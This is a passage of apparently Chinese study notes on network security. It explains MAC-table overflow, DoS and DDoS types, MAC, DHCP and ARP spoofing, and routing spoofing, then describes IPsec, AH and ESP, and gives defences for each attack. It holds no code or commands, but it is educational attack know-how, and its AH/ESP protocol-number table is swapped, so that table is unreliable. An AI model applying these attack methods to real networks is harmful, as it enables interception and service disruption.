color=red>耗尽交换机转发表的存储空间</font>，使得交换机无法根据接收到的MAC帧的转发表中添加转发项的攻击行为+ 黑客终端不断发送源MAC地址变化的MAC帧，如发送一系列源MAC地址分别为MAC1、MAC2...的MAC帧使得交换机转发表中添加MAC地址分别为MAC 1、MAC 2...的转发项，<font color=red>这些转发项耗尽交换机转发表的存储空间</font>+ 当交换机接受到终端B发送的源MAC地址为MAC B的MAC帧时，由于转发表的存储空间已经耗尽，因此无法添加新的MAC地址为MAC B的转发项+ <font color=red>导致交换机以广播方式完成MAC帧终端A至终端B传输过程</font></li><li><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230629224557400.png" alt="image-20230629224557400" style="zoom:80%;" /></p><ul><li>实现过程如下：该以太网结构式交换机以太网，因此，只有在各台交换机以广播的形式转发各个终端之间传输的MAC帧时，黑客终端才能嗅探到以太网中各个终端之间的传输的MAC帧。<font color=red>黑客终端需要实施MAC表溢出攻击，持续发送以随机产生的单播MAC地址为源MAC地址、广播MAC地址为目的MAC地址的MAC帧</font>。导致交换机S1、S2、S3中的MAC表溢出，交换机S1、S2、S3以广播形式转发各个终端的MAC帧。</li></ul></li><li><h5 id="嗅探攻击防御："><a href="#嗅探攻击防御：" class="headerlink" title="嗅探攻击防御："></a>嗅探攻击防御：</h5><ul><li>对于集线器：<font color=red>需要防止黑客终端接入集线器</font></li><li>交换机：<ul><li>需要防止黑客终端接入交换机</li><li><font color=red>交换机需要有防御MAC表溢出攻击的机制</font></li></ul></li><li><font color=red>无线通信过程，嗅探攻击是无法避免的，此时需要对信息进行加密</font></li></ul></li></ul></li></ul></li></ul><h3 id="c-拒绝服务攻击原理-防御机制"><a href="#c-拒绝服务攻击原理-防御机制" class="headerlink" title="c) 拒绝服务攻击原理/防御机制"></a><strong>c)</strong> <font color=red>拒绝服务攻击原理/防御机制</font></h3><h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a><font color=pink><strong>拒绝服务攻击</strong></font></h4><ul><li><p>概念：攻击者通过某种手段，有意的造成计算机或网络不能正常运转从而不能像合法用户提供所需服务或者使服务质量降低</p><ul><li>服务：系统提供，用户使用受益</li><li><font color=red>拒绝服务</font>：任何对服务的干涉如果使得器可用性降低或失去可用性成为拒绝服务，如：带宽耗尽</li><li>攻击方式：消耗系统或网络资源；阻断访问路径；更改系统配置</li><li>攻击目标：主要以网站、路由器、域名服务器等网络基础设施</li></ul></li><li><p>分类：</p><ul><li><p>Dos（拒绝服务攻击）；DDos（分布拒绝攻击）</p></li><li><p>按攻击方式：</p><ul><li>资源破坏型Dos：耗尽资源</li><li>物理破坏型Dos：摧毁主机或网络节点</li><li>服务终止型Dos：攻击导致服务崩溃</li></ul></li><li>按攻击是否针对受害者：<ul><li>直接型Dos：</li><li>间接型Dos：</li></ul></li><li>按攻击机制：<ul><li>剧毒包型攻击：利用协议或软件漏洞发送异常数据包导致系统崩溃，对攻击者计算能力和网络带宽没有要求</li><li>风暴型拒绝服务攻击：发送大量数据包导致系统崩溃，“带宽攻击”</li><li>重定向攻击：修改网络参数攻击，<ul><li>重定向目标是攻击者主机，“中间人攻击”</li><li>目标是不存在的主机，拒绝服务攻击</li></ul></li></ul></li><li>属性分类法<ul><li>攻击静态属性</li><li>攻击动态属性</li><li>攻击交互属性</li></ul></li></ul></li><li><p>Dos攻击原理：</p><ul><li>剧毒包Dos：也叫漏洞攻击或协议攻击<ul><li>WinNuke攻击<ul><li>特征：以带外数据攻击目标端口，导致受害者处理带外数据时出现异常，从而使系统停止响应并显示蓝屏，也叫“带外攻击”、“蓝屏攻击”</li><li>被攻击端口：139、138、137、113、53</li></ul></li><li>Land攻击<ul><li>特征：利用主机处理TCP连接请求的漏洞，构造特殊的TCP SYN包（第一步中用于发起TCP连接请求），<font color=red>该数据包的源地址和目标地址都被设置成受害者主机的IP地址</font>，导致收到数据包的主机向自己回复TCP SYN+ACK消息，同时主机又发回自己一个ACK消息创建一个空连接。</li></ul></li><li>Ping of death攻击：<ul><li>原理：利用协议实现时的漏洞，向受害者发送超长的Ping数据包，导致受害者系统异常早期路由器对包的最大尺寸有限制，如TCP/IP协议栈规定ICMP包不能超过64KB，当加载的数据大小超过64KB上限时，出现内存分配错误，导致接收方死机</li><li>别名：ssping</li></ul></li><li>泪滴攻击</li><li>循环攻击<ul><li>两个都会产生输出的端口建立连接，第一个的输出可能是第二的输入同时又作为第一个的输入，进而导致大量数据包产生，导致拒绝服务</li></ul></li></ul></li><li>风暴型Dos攻击：通过大量无用数据包占用资源达到拒绝服务目的，“带宽攻击”<ul><li>直接风暴型攻击</li><li>反射攻击（DRDos）：通过中间主机发起攻击</li><li>成功的根本原因：网络带宽和系统资源是有限的</li></ul></li><li>Dos攻击原理：攻击代理通常采用向目标主机发送大量的网络分组：<ul><li>TCP洪流：向目标主机发送大量设置不同标志位的TCP分组</li><li>ICMP Echo请求/响应报文：向目标主机发送大量的ICMP分组</li><li>UDP洪流：向目标主机发送大量各种基于UDP协议的应用协议包，</li><li>应用层协议：向目标直接或间接发送大量特定应用协议数据包，常用攻击的协议又HTTP/HTTPS、NTP</li></ul></li></ul></li><li><p>DDos攻击原理：</p><ul><li>攻击者寻找可入侵主机</li><li>控制主机，用于放置后门等</li><li>选出满足建立网络需要的主机，放置编译好的守护程序，对控制的计算机发出命令</li><li>黑客发送控制命令给主控机，启动对目标系统的攻击</li><li>主控机发送攻击信号给被控机，被控机开始对目标系统发动攻击</li><li>目标系统被无数伪造的请求淹没，无法对合法用户进行响应。</li></ul></li><li><p>防御机制：</p><ul><li>防御难点：<ul><li>不容易定位攻击者的位置</li></ul></li><li>依据DDoS攻击工具的特征检测：<ul><li>特定端口</li><li>标志位</li><li>特定数据内容</li></ul></li><li>统计检测</li><li>主机网络连接特征检测</li><li>根据异常流量检测<ul><li>Dos工具产生的网络通信信息有控制信息和攻击时的网络通信。根据以下异常现象检测：<ul><li>大量目标主机域名解析</li><li>极限通信流量</li><li>特大型的ICMP和UDP数据包</li><li>不属于正常连接通信的TCP和UDP数据包</li><li>数据段内容只含文字和数字的数据包</li></ul></li></ul></li><li>拒绝服务攻击响应技术：从原理上有四种：丢弃恶意分组、源端控制、追溯发起攻击端、路由器动态检测流量并控制<ul><li>分组过滤：对特定的流量进行过滤</li><li>源端控制：通常参与DoS攻击的分组的源IP地址都是假冒的，源端过滤可以减少或者消除假冒IP现象</li><li>追溯：假定存在源地址假冒，试图在攻击的源头控制攻击：<ul><li>IP追溯：路由器标记路过的分组</li><li>ICMP追溯：路由器概率抽样标记转发分组</li><li>链路测试：攻击进行时才有效</li></ul></li><li>路由器动态检测和控制：在路由器上动态检测和控制Dos攻击引起的拥塞，攻击分组可能来源于多个流，但是存在某种共同特征。</li></ul></li><li>对抗风暴型DDos：流量清洗<ul><li>针对互联网数据中心或云服务的中大型用户</li><li>对进入IDC或云的数据流量进行实时监控，及时发现包括DDos攻击在内的异常流量</li><li>在不影响业务的前提下，清洗掉异常流量</li><li>通常分成3个部分，攻击检测、攻击缓解、监控管理<ul><li>攻击检测：对用户业务流量进行逐包检测，发现隐藏的非法流量。技术有静态漏洞攻击特征检查、动态规则过滤、异常流量限速、用户流量模型异常检测等</li><li>攻击缓解：将可疑流量从原始网络路径中重定向到净化清洗中心上进行恶意流量的识别和剥离，还原出的合法流量被回注到原网络、</li><li>监控管理：对流量清洗系统的设备进行集中管理配置</li></ul></li></ul></li><li><font color=red>拒绝服务攻击时最容易实现，同时也是最难防护的攻击手段</font></li></ul></li></ul><h3 id="d-截获攻击，Mac地址欺骗攻击；Arp欺骗攻击"><a href="#d-截获攻击，Mac地址欺骗攻击；Arp欺骗攻击" class="headerlink" title="d) 截获攻击，Mac地址欺骗攻击；Arp欺骗攻击"></a>d) 截获攻击，Mac地址欺骗攻击；Arp欺骗攻击</h3><h4 id="截获攻击"><a href="#截获攻击" class="headerlink" title="截获攻击"></a><font color=pink><strong>截获攻击</strong></font></h4><ul><li>攻击原理：<font color=red>截获攻击需要改变信息传输路径</font>，使得信息传输路径经过黑客终端，黑客终端截获信息后，可以继续转发该信息、转发篡改后的信息、重复多次转发该信息。<font color=red>截获攻击是主动攻击</font>。<ul><li>黑客首先需要改变终端A至终端B的传输路径，将终端A至终端B的传输路径变为终端A——-&gt;黑客终端———&gt;终端B，使得终端A传输给终端B的信息必须经过黑客终端</li><li>黑客终端截获A传出给B的信息，可进行如下操作：<ul><li>篡改信息后发给B</li><li>保持信息一段时间后再发给B或反复多次转发同一信息给B</li><li>保持信息，不转发给B</li></ul></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630170712913.png" alt="image-20230630170712913" style="zoom:67%;" /></li></ul></li><li>攻击后果：<ul><li><font color=red>获得用户的私密信息</font>：如获取Telnet访问服务器使用的用户名和口令</li><li><font color=red>篡改信息</font></li><li><font color=red>实施重放攻击</font>：即使用户采用密文方式传输信息，黑客终端截获某个IP分组后，可以实施重放攻击+ 如用户通过Web服务器进行网上购物，黑客截获IP分组，根据分组所属TCP连接和连接另一端的服务器类型，确定用于电子购物的IP分组；+ <font color=red>黑客终端可以不立即转发该IP分组，而是在一段时间后再转发，造成服务器的信息错误</font></li></ul></li></ul><h4 id="MAC地址欺骗攻击"><a href="#MAC地址欺骗攻击" class="headerlink" title="MAC地址欺骗攻击"></a><font color=pink><strong>MAC地址欺骗攻击</strong></font></h4><ul><li><p>MAC帧的正常转发过程：</p><ul><li><p>当交换机在转发表中为连接在以太网的每一个终端建立转发项后，能够以单播的方式实现以太网中任何两个终端之间的MAC帧传输过程。</p></li><li><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630172102348.png" alt="image-20230630172102348" style="zoom:67%;" /></p><ul><li><p>eg：终端C至终端A的MAC帧传输路径为：</p><p>终端C——&gt;S3.端口1——&gt;S3.端口2——&gt;S2.端口2——&gt;S2.端口1——&gt;S1.端口3——&gt;S1.端口1——&gt;端口A</p></li></ul></li><li><p>交换机S2通过转发表中MAC地址为MAC A的转发项<MAC A，1>确定S2.端口2到S2.端口1的交换过程</p></li><li><p>交换机S1通过转发表中MAC地址为MAC A的转发项<MAC A，1>确定S1.端口3到S1.端口1的交换过程</p></li></ul></li><li><p>MAC地址欺骗攻击流程：</p><ul><li><p>接入以太网，<font color=red>黑客终端通过连接到交换机S3的端口3</font>接入以太网</p></li><li><font color=red>将自己的MAC地址修改为终端A的MAC地址MAC A</font></li><li><p>发送以MAC A为源MAC地址、以广播地址为目的地址的MAC帧</p></li><li><p>黑客完成上述操作，以太网中各个交换机的转发表如图，</p></li><li><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630172102348.png" alt="image-20230630172102348" style="zoom: 67%;" /><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630173332559.png" alt="image-20230630173332559" style="zoom: 67%;" /></p><p>​                                   <strong>黑客操作前</strong>                                                                               <strong>黑客操作后</strong></p></li><li><p>转发表中MAC地址为MAC A的转发项将通过黑客终端的交换路径作为目的MAC地址为MAC A的MAC帧的传输路径</p><ul><li><p>如果此时终端B向终端A发送MAC帧，该MAC帧传输路径如下：</p><p>终端B——&gt;S1.端口2——&gt;S1.端口3——&gt;S2.端口1——&gt;S2.端口2——&gt;S3.端口2——&gt;S3.端口3——&gt;黑客终端</p></li></ul></li></ul></li><li><p>防御机制：</p><ul><li>阻止黑客终端接入以太网</li><li>阻止黑客终端发送的伪造的MAC地址为源MAC地址的MAC帧进入以太网</li></ul></li></ul><h4 id="DHCP欺骗攻击"><a href="#DHCP欺骗攻击" class="headerlink" title="DHCP欺骗攻击"></a><font color=pink><strong>DHCP欺骗攻击</strong></font></h4><ul><li>攻击原理：<ul><li>终端访问网络前需要配置网络信息，如IP地址。子网掩码。默认网关地址和地域服务器地址</li><li>网络信息可以手动配置，也可以通过DHCP自动从服务器获取</li><li><font color=red>终端网络信息（包括电脑、手机）一般都是自动获取</font>：当网络中存在多个DHCP服务器时，终端随机选择一个能够提供DHCP服务的服务器为其提供网络信息，为攻击提供可能</li><li>黑客可以<font color=red>伪造一个DHCP服务器</font>，并将其接入网络</li><li><font color=red>伪造的DHCP服务器中将黑客终端的IP地址作为默认网关地址</font></li><li>当终端从伪造的DHCP服务器获取错误的默认网关地址后，所有发送给其他网络的IP分组将首先发送给黑客终端</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630195815459.png" alt="image-20230630195815459" style="zoom:67%;" /></li></ul></li><li>攻击过程：<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630195949897.png" alt="image-20230630195949897" style="zoom: 80%;" /></li><li>正常DHCP服务器网络设置在<font color=red>局域网LAN 2</font>内，DHCP服务器的IP地址为192.2.2.5，<font color=red>路由器R</font>通过配置中继地址192.2.2.5，将其他局域网内终端发送的DHCP发现和请求消息转发给DHCP服务器</li><li>如果黑客终端想要截获所有<font color=red>LAN 1</font>内终端发送给其他局域网的IP分组，可以在LAN 1内连接一个伪造的DHCP服务器，伪造的DHCP服务器配置的子网掩码和可分配的IP地址范围与正常DHCP服务器为LAN 1配置的参数基本相同</li><li>但是将默认网关地址设置为黑客终端地址，如图示的192.1.1.253；如果LAN 1内终端通过伪造的DHCP服务器获得网络信息，其中的网络默认网关地址时黑客终端地址，从而使得LAN 1内终端将发送给其他局域网的IP分组先传输给黑客终端，黑客终端复制IP分组，再将分组转发给真正的默认网关，如图的192.1.1.254，以此使得LAN 1内终端感觉不到发送给其他局域网的IP分组已经被黑客终端截获</li><li>LAN 1内终端发现DHCP服务器过程中，往往选择先向其发送的DHCP服务器作为其配置网络信息的DHCP服务器。由于伪造的DHCP服务器位于LAN 1内，因此，LAN 1内终端一般情况会先收到伪造的DHCP服务器提供的信息，选择伪造的DHCP服务器</li></ul></li><li>防御机制：<ul><li><font color=red>关键时不允许伪造的DHCP服务器接入局域网</font></li></ul></li></ul><h4 id="ARP欺骗攻击"><a href="#ARP欺骗攻击" class="headerlink" title="ARP欺骗攻击"></a><font color=pink><strong>ARP欺骗攻击</strong></font></h4><ul><li><p>ARP(地址解析协议)：已知一个机器的IP地址，找出其对应的硬件地址</p><ul><li>作用：从网络使用的IP地址解析出数据链路层使用的硬件地址</li><li><font color=red>每一个终端都有ARP缓冲区</font>，一旦完成地址解析过程，ARP缓冲区中建立IP地址与MAC地址的绑定项。如果已经存在，租用绑定项中的结果作为解析结果，不在进行地址解析过程</li><li>如果终端A已经获取终端B的IP电子地址IP B，需要解析出终端B的MAC地址，A会广播如图的ARP请求报文。请求报文给出终端A的IP地址IP A与终端A的MAC地址MAC A的绑定项，同时给出终端B的IP地址IP B。</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630202454477.png" alt="image-20230630202454477" style="zoom:80%;" /></li><li>该广播报文被以太网中的所有终端接收，所有终端的ARP缓冲区中记录下终端A的IP地址IP A和MAC地址MAC A的绑定项，只有终端B向终端A发送ARP响应报文，其中给给出终端B的IP地址IP B与MAC地址MAC B的绑定项。</li><li>终端A将绑定项记录在ARP缓冲区中。当以太网中的终端需要向终端A发送MAC帧时，可通过ARP缓冲区IP A与MAC A的绑定项直接获得终端A的MAC地址。</li></ul></li><li><p>攻击原理：</p><ul><li><font color=red>由于以太网中终端无法鉴别ARP请求报文中给出的IP地址与MAC地址绑定的真伪</font>。只是将绑定项记录在ARP缓冲区</li><li>如果终端A想要截获其他终端发送给终端B的IP分组，在发送的ARP请求报文中给出IP地址IP B和MAC地址MAC A的绑定项</li><li><font color=red>**其他终端在ARP缓冲区中记录IP B与MAC A的绑定项**</font></li><li>如果需要向IP地址为IP B的节点传输IP分组</li><li>该IP分组被封装称以MAC A为目的MAC地址的MAC帧</li><li><p>该MAC帧经过以太网传输最后到达A，而不是B（取决于MAC地址到底是谁）</p></li><li><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630203629361.png" alt="image-20230630203629361" style="zoom:80%;" /></p></li><li>黑客终端分配的IP地址为IP C，网卡的MAC地址为MAC C，而终端A分配的IP地址为IP A，网卡的MAC地址为MAC A。</li><li>正常情况下，<font color=red>路由器ARP缓冲区中应该将IP A和MAC A绑定在一起</font>，当路由器需要转发目的IP地址为IP A的IP分组时，或者通过ARP地址解析协议过程解析出IP A对应的MAC地址（ARP缓冲区中没有IP A对应的MAC地址），或者直接从ARP缓冲区检索IP A对应的MAC地址时</li><li>将IP分组封装称以MAR R为源MAC地址。MAC A为目的MAC地址的MAC帧，然后，通过连接路由器和终端的A的以太网将该MAC帧发送给终端A</li><li>当黑客终端希望通过ARP欺骗来截获发送给终端A的IP分组时，<font color=red>首先广播一个ARP请求报文，并在<u>请求报文中将终端A的IP地址IP A和自己的MAC地址MAC C绑定在一起</u>，路由器接收到该ARP请求报文后，在ARP缓冲区记录IP A和MAC C的绑定项</font></li><li>当路由器需要转发目的地址为IP A的IP分组时，将该IP分组封装成以MAC R为源MAC地址、MAC C为目的地址的MAC帧，这样连接路由器和终端的以太网将MAC帧传输给黑客终端，而不是终端A；通常黑客在拦截前，会通过攻击瘫痪掉终端A</li></ul></li><li><p>防御机制：</p><ul><li>终端没有鉴别ARP请求报文能力，需要<font color=red>以太网交换机提供鉴别ARP请求和响应报文中IP地址与MAC地址绑定项真伪的能力</font>，只需转发正确的IP地址和MAC地址绑定项的ARP请求</li></ul></li></ul><h3 id="e-路由欺骗攻击，原理及过程"><a href="#e-路由欺骗攻击，原理及过程" class="headerlink" title="e)路由欺骗攻击，原理及过程"></a><strong>e)</strong><font color=red>路由欺骗攻击</font>，原理及过程</h3><h4 id="生成树欺骗攻击"><a href="#生成树欺骗攻击" class="headerlink" title="生成树欺骗攻击"></a><font color=pink><strong>生成树欺骗攻击</strong></font></h4><ul><li><p>工作原理：</p><ul><li><font color=red>交换机工作原理要求不允许交换机之间出现环路</font></li><li><p>协议允许设计一个存在冗余链路的网络，但在网络运行时，通过阻塞某些端口使整个网络没有 环路。</p></li><li><p>交换机标识符：</p><ul><li><p>| 交换机优先级 | 交换机MAC地址 |<br>| :—————: | :—————-: |<br>|              |               |</p></li><li><font color=red>所有交换机中交换机标识符值最小的交换机为根交换机</font></li></ul></li></ul></li><li><p>攻击过程：</p><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630205904037.png" alt="image-20230630205904037" style="zoom: 67%;" /></li></ul></li><li><p>防御：</p><ul><li>不允许黑客终端参与网络生成树建立过程</li></ul></li></ul><h4 id="路由欺骗攻击"><a href="#路由欺骗攻击" class="headerlink" title="路由欺骗攻击"></a><font color=pink><strong>路由欺骗攻击</strong></font></h4><ul><li>攻击原理：<ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630210323991.png" alt="image-20230630210323991" style="zoom:67%;" /></li><li>如果黑客终端想要截获路由器R1传输给网络W的IP分组，<font color=red>向路由器R1发送一项伪造的路由项，该伪造的路由项将通往网络W的距离设置为0</font>。路由器R接收到该路由项，选择黑客终端作为下一条，并计算出路由表中目的网络为网络W的路由项</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630210633392.png" alt="image-20230630210633392" style="zoom:67%;" /></li><li>黑客接收到IP分组后，再将分组发给路由器R2，使得IP分组最终可以到达网络W，以此欺骗路由器R1和该IP分组的发送端</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230630210955417.png" alt="image-20230630210955417" style="zoom:67%;" /></li><li>路由器R1通过路由协议生成正确的路由表，A发送B的IP分组：<ul><li>A——&gt;路由器R1——&gt;R2——&gt;R3——&gt;B</li></ul></li><li>如果黑客想要截获LAN 1终端发送给LAN 4的IP分组，连接在LAN 2的黑客终端发送一个黑客终端IP地址为源地址、组播地址为224.0.0.9为目的地址的路由消息，其伪造了一项黑客终端直接和LAN 4连接的路由项。</li><li>与黑客连在同一网络的R1和R2接收路由消息，对R1来说，由于伪造路由项给出的到达LAN 4的距离最短所以路由表发生错误改变，终端A发送的IP分组最后从R1错误的转发给黑客，而不是正确路径的R2</li></ul></li><li>防御机制：<ul><li>路由器接收消息先鉴别发送端，对消息进行检测</li><li>确定路由消息是由认证的相邻路由器发送且未被篡改</li></ul></li></ul><h2 id="IP与路由安全"><a href="#IP与路由安全" class="headerlink" title="IP与路由安全"></a>IP与路由安全</h2><h3 id="a-IPv4协议-主要的安全问题"><a href="#a-IPv4协议-主要的安全问题" class="headerlink" title="a) IPv4协议,主要的安全问题"></a><strong>a)</strong> <font color=red>IPv4协议</font>,主要的安全问题</h3><h4 id="IPV4协议"><a href="#IPV4协议" class="headerlink" title="IPV4协议"></a><font color=pink><strong><a href="#IPV4地址">IPV4协议</a></strong></font></h4><ul><li>安全性分析:<ul><li>没有认证机制：<ul><li>没有源地址认证：源地址假冒</li><li>没有完整性认证：篡改</li></ul></li><li>没有加密机制：<ul><li>无机密性：监听应用数据</li><li>泄露拓扑等信息：网络侦察</li></ul></li><li>无带宽控制：<ul><li>DDoS攻击</li></ul></li></ul></li></ul><h3 id="b-IPSec安全策略，运行模式"><a href="#b-IPSec安全策略，运行模式" class="headerlink" title="b)IPSec安全策略，运行模式"></a><strong>b)</strong><font color=red>IPSec安全策略，运行模式</font></h3><h4 id="IPsec"><a href="#IPsec" class="headerlink" title="IPsec"></a><font color=pink><strong>IPsec</strong></font></h4><ul><li><p>端到端的确保IP同通信安全：认证、加密及密钥管理；为IPv6制定，支持IPv4</p></li><li><p>IP数据包通过IPsec隧道进行加密传输，有效保证数据在不安全的网络环境中传输的安全性。</p></li><li><p>标准内容：</p><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230702154305641.png" alt="image-20230702154305641" style="zoom: 50%;" /></li><li>IPsec通过允许系统选择所需的安全协议(AH或ESP)，决定服务使用的加密或认证算法，提供任何服务需要的密钥来提供IP级的安全服务</li><li>RFC4301列出的安全服务包括：访问控制、无连接完整性、数据源认证、拒绝重放包、保密性等</li></ul></li><li><p>安全策略：基础是应用于每一个从源端到目的端传输的IP包上的安全策略，主要有两个交互的数据库安全关联数据库(SAD)，安全策略数据库(SPD)</p><ul><li>安全关联SA：指定由通信主机识别的安全属性；单个SA保护单一方向数据<ul><li>一个SA：发送端和接收端之间的单向逻辑连接，为数据流提供安全服务；经过同一SA的数据流得到相同的安全服务；AH或ESP</li><li>SA对：双向安全数据交换</li><li>同时支持AH、ESP且双向：需要两队SA</li><li>一个SA参数：<ul><li>安全参数索引（SPI）：32位，接收方根据SPI选择合适的SA</li><li>IP目的地址：仅单播</li><li>安全协议标识：AH/ESP</li></ul></li><li>SAD定义了所有SA相关的参数：<ul><li>安全参数索引</li><li>序列号计算器</li><li>序列计数器溢出</li><li>反重放窗口</li><li>AH信息</li><li>ESP信息</li><li>安全关联的生存期</li><li>IPsec协议模式：隧道、传输或通配符</li><li>最大传输单元路径</li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701110348215.png" alt="image-20230701110348215" style="zoom:67%;" /></li></ul></li><li>安全策略SP：指定对IP数据包提供何种保护，并以何种方式实施保护<ul><li>根据源IP、目的IP、出入数据来标识</li><li>用户设定自己的安全策略的粒度：IP地址，传输层协议等</li><li>操作：Discard、Bypass、Protect</li><li>SPD中每一条SP包括：<ul><li>本地IP</li><li>远程IP</li><li>下一层协议</li><li>名称</li><li>本地或远程端口</li></ul></li></ul></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701110853327.png" alt="image-20230701110853327" style="zoom:67%;" /></li><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701110907884.png" alt="image-20230701110907884" style="zoom:67%;" /></li></ul></li></ul></li><li><p>运行模式：传输模式和隧道模式</p><ul><li><p>区别：</p><p><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701111631148.png" alt="image-20230701111631148" style="zoom:67%;" /></p><p>|        |                          传输模式SA                          |                          隧道模式SA                          |<br>| :——: | :—————————————————————————————: | :—————————————————————————————: |<br>|   AH   |      对IP载荷和IP首部的选中部分、IPv6的扩展首部进行认证      | 对整个内部IP包(内部首部和IP载荷)和外部IP首部的选中部分、外部IPv6的扩展首部进行认证 |<br>|  ESP   |     对IP载荷和跟在ESP首部后面的任何IPv6扩展首部进行加密      |                       加密整个内部IP包                       |<br>| AH+ESP | 对IP载荷和ESP首部后面任何的IPv6扩展首部进行加密，同时对IP载荷进行认证，但不认证IP首部 |                     加密认证整个内部IP包                     |</p></li><li><p>传输模式：常用在两台主机的安全通信</p></li><li>隧道模式(默认)：常用于网关之间，或在网关的终端站</li></ul></li></ul><h3 id="c-AH协议，定义及结构"><a href="#c-AH协议，定义及结构" class="headerlink" title="c) AH协议，定义及结构"></a>c) AH协议，定义及结构</h3><h4 id="AH协议-报文验证头协议"><a href="#AH协议-报文验证头协议" class="headerlink" title="AH协议(报文验证头协议)"></a><font color=pink><strong>AH协议(报文验证头协议)</strong></font></h4><ul><li>AH和ESP关注的问题：<ul><li>加密、认证的范围（即对IP协议报文的哪些部分进行保护）</li><li>传输模式和隧道模式在保护对象、性能、适用场景等方面的差别</li><li>与NAT的兼容性问题</li></ul></li><li>AH：IP包的数据完整性。、数据来源认证和抗重放攻击服务<ul><li>完整性：采用HMA算法：<font color=red>HMAC-MD5</font>(必须)、<font color=red>HMAC-SHA1</font>(必须)</li><li>抗重放：序列号</li></ul></li><li>AH首部：<img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701155616462.png" alt="image-20230701155616462" style="zoom:67%;" /></li><li>AH运行模式：<font color=red>传输模式</font><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701155734129.png" alt="image-20230701155734129" style="zoom:67%;" /></li></ul></li><li><font color=red>隧道模式</font><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701155806166.png" alt="image-20230701155806166" style="zoom:67%;" /></li></ul></li><li>抗重放攻击：<font color=red>序列号+滑动窗口机制</font><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701155916408.png" alt="image-20230701155916408" style="zoom:67%;" /></li></ul></li><li>完整性校验：<ul><li>算法：在SA中指定</li><li>哪些字段参与计算：</li><li>如何处理IPv4和IPv6首部中的三种字段：不变字段，可变但可预测字段、可变不可预测字段<ul><li>IP数据包头：只包括在传输期间不变的字段或接收方可预测的字段，其余不定的字段全置为0</li><li>AH：出“鉴别数据”字段外其他的所有字段，“鉴别数据”字段被指为0</li><li>IP数据包中的所有上层协议数据</li></ul></li><li>完整性校验值ICV<ul><li>IPv6基本首部三种字段</li><li>IPv6扩展首部三种字段</li></ul></li></ul></li></ul><h3 id="d-ESP协议，定义及结构"><a href="#d-ESP协议，定义及结构" class="headerlink" title="d) ESP协议，定义及结构"></a>d) ESP协议，定义及结构</h3><h4 id="ESP协议-报文安全封装协议"><a href="#ESP协议-报文安全封装协议" class="headerlink" title="ESP协议(报文安全封装协议)"></a><font color=pink><strong>ESP协议(报文安全封装协议)</strong></font></h4><ul><li><p>除了提供IP包的数据完整性、数据来源认证和抗重放攻击服务，还提供数据包加密和数据流加密服务</p><ul><li>完整性：采用HMAC算法；<font color=red>ESP认证的数据范围要小于AH协议</font></li><li>加密：对称加密，必须支持：DES-CBC和NULL算法（<font color=red>认证和加密不能同时为NULL</font>）</li></ul></li><li><p>ESP首部：</p><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701161632688.png" alt="image-20230701161632688" style="zoom:67%;" /></li></ul></li><li><p>运行模式：传输模式</p><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701161913598.png" alt="image-20230701161913598" style="zoom:67%;" /></li></ul></li><li><p>隧道模式</p><ul><li><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230701161944765.png" alt="image-20230701161944765" style="zoom:67%;" /></li></ul></li><li><p>ESP传输模式与隧道模式对比：</p><ul><li>隧道模式对整个IP包进行认证和加密，因此可以提供数据流加密服务，而传输模式由于IP包首部不被加密，因此无法提供数据流加密服务。但是隧道模式由于增加了一个新IP首部，降低了链路的带宽利用率</li><li>传输模式适合保护支持ESP协议的主机之间的通信连接，而隧道模式则在包含防火墙或其他用于保护可信内网不受外网攻击的安全网关的配置中比较有效</li></ul></li><li><p>与NAT兼容问题：</p><ul><li>AH与NAT不兼容</li><li>ESP不对IP包首部进行认证，因此不存在和NAT不兼容的问题。如果通信的任何一方具有私有地址或在安全网关后面，仍然可以用ESP来保护其安全，因为NAT网关或安全网关可以修改IP首部中的源/目的IP地址来确保双方的通信不受影响。</li></ul></li><li><p>AH与ESP比较</p><ul><li><p>|                | ESP和AH比较 |                  |<br>| :——————: | :————-: | :———————: |<br>|     安全性     |     AH      |       ESP        |<br>|     协议号     |     50      |        51        |<br>| 数据完整性校验 |    支持     | 支持(不验证IP头) |<br>|   数据源验证   |    支持     |       支持       |<br>|   数据加解密   |   不支持    |       支持       |<br>|    抗重服务    |    支持     |       支持       |<br>| NAT-T(nat穿透) |   不支持    |       支持       |</p></li><li><p>IPsec体系结构文档中指出，当两个传输模 式SA被绑定，在同一个端对端流中允许AH和ESP两种协议，但认为只有先ESP协议 再实施AH协议才合适，为什么？<font 